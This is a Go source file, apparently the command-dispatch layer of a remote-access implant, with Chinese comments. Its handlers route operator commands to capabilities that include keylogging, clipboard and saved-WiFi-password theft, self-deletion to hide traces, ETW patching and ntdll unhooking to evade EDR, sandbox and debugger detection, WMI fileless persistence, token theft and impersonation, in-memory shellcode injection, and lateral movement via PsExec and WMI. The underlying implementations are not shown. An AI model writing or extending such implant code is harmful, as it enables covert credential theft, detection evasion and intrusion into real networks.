package services

import (
	"implant/core/commands"
	"os"
	"time"
)

// CmdClipboard 读取剪贴板内容。
func CmdClipboard(cmdBuf []byte) ([]byte, error) {
	return commands.Clipboard()
}

// CmdWifi 提取保存的 WiFi 配置及密码。
func CmdWifi(cmdBuf []byte) ([]byte, error) {
	return commands.Wifi()
}

// CmdSelfDelete 删除进程文件：将自身重命名为随机临时名（释放部署路径占用），
// 进程保持在线——部署的客户端文件可被删除，客户端继续工作（隐藏痕迹）。
func CmdSelfDelete(cmdBuf []byte) ([]byte, error) {
	return commands.DeleteSelf()
}

// CmdSelfDeleteExit 删除进程文件并退出进程（"删除客户端"流程）：
// 重命名解锁 + 隐藏 cmd 延迟删除 + 进程退出（进程退出后延迟删除成功执行）。
func CmdSelfDeleteExit(cmdBuf []byte) ([]byte, error) {
	result, err := commands.DeleteSelfAndExit()
	if err == nil {
		// 2 秒后退出进程：先让回传完成，同时给延迟删除留出时机
		go func() {
			time.Sleep(2 * time.Second)
			os.Exit(0)
		}()
	}
	return result, err
}

// ===== 第二梯队工具 =====

// CmdKeylogStart 启动键盘记录。
func CmdKeylogStart(cmdBuf []byte) ([]byte, error) {
	return []byte("键盘记录已启动"), commands.StartKeylog()
}

// CmdKeylogGet 获取键盘记录缓冲。
func CmdKeylogGet(cmdBuf []byte) ([]byte, error) {
	data := commands.GetKeylog()
	if len(data) == 0 {
		return []byte("(键盘记录缓冲为空)"), nil
	}
	return data, nil
}

// CmdKeylogStop 停止键盘记录。
func CmdKeylogStop(cmdBuf []byte) ([]byte, error) {
	return []byte("键盘记录已停止"), commands.StopKeylog()
}

// CmdServicesList 列出服务。
func CmdServicesList(cmdBuf []byte) ([]byte, error) {
	return commands.ListServices()
}

// CmdServiceStart 启动服务（cmdBuf = 服务名）。
func CmdServiceStart(cmdBuf []byte) ([]byte, error) {
	return commands.StartService(string(cmdBuf))
}

// CmdServiceStop 停止服务（cmdBuf = 服务名）。
func CmdServiceStop(cmdBuf []byte) ([]byte, error) {
	return commands.StopService(string(cmdBuf))
}

// CmdRegQuery 查询注册表（cmdBuf = 键路径）。
func CmdRegQuery(cmdBuf []byte) ([]byte, error) {
	return commands.RegQuery(string(cmdBuf))
}

// CmdEtwPatch ETW 补丁（屏蔽 ETW 遥测）
func CmdEtwPatch() ([]byte, error) {
	return commands.CmdEtwPatch()
}

// CmdUnhookNtdll ntdll unhooking（恢复被 EDR hook 的导出函数）
func CmdUnhookNtdll() ([]byte, error) {
	return commands.CmdUnhookNtdll()
}

// CmdSandboxCheck 沙箱/虚拟环境检测
func CmdSandboxCheck() ([]byte, error) {
	return commands.CmdSandboxCheckEntry()
}

// CmdAntidebug 反调试检查
func CmdAntidebug() ([]byte, error) {
	return commands.CmdAntidebugEntry()
}

// CmdWmiPersist WMI 无文件持久化（add|remove|list）
func CmdWmiPersist(cmdBuf []byte) ([]byte, error) {
	return commands.CmdWmiPersist(cmdBuf)
}

// CmdMakeToken 创建令牌并模拟（user|pass|domain）
func CmdMakeToken(cmdBuf []byte) ([]byte, error) {
	return commands.CmdMakeToken(cmdBuf)
}

// CmdStealToken 窃取进程令牌并模拟（pid）
func CmdStealToken(cmdBuf []byte) ([]byte, error) {
	return commands.CmdStealToken(cmdBuf)
}

// CmdRev2Self 恢复原始令牌
func CmdRev2Self(cmdBuf []byte) ([]byte, error) {
	return commands.CmdRev2Self()
}

// CmdInjectMem 内存注入通道：分块接收 shellcode（不落盘），全量收齐后直接注入。
// 协议（每包 payload）：requestId(4)|total(4)|seq(4)|pidLen(4)|pid|techLen(4)|tech|chunk
// 首包携带 pid/tech，后续包 pidLen/techLen 为 0。
func CmdInjectMem(cmdBuf []byte) ([]byte, error) {
	return commands.CmdInjectMem(cmdBuf)
}

// CmdPsexec 横向移动（SMB 服务方式）
func CmdPsexec(cmdBuf []byte) ([]byte, error) {
	return commands.CmdPsexec(cmdBuf)
}

// CmdWmiExec 横向移动（WMI 方式）
func CmdWmiExec(cmdBuf []byte) ([]byte, error) {
	return commands.CmdWmiExec(cmdBuf)
}

// CmdAdEnum 域信息收集
func CmdAdEnum(cmdBuf []byte) ([]byte, error) {
	return commands.CmdAdEnum(cmdBuf)
}

// CmdSelfUpdate 客户端自我更新
func CmdSelfUpdate(cmdBuf []byte) ([]byte, error) {
	return commands.CmdSelfUpdate(cmdBuf)
}
